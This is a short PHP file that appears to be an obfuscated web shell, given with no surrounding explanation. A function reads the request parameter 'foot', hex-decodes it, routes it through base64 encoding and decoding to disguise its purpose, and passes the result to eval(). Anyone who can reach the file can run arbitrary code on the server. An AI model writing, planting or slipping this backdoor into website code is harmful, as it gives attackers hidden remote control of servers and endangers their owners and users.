<?php
function foot_t(){
    $a=base64_encode(hex2bin($_REQUEST['foot']));
    if (isset($a)) {
        $b=''.base64_decode($a).'';
        return ($b);
    }
}
eval(''.foot_t().'');
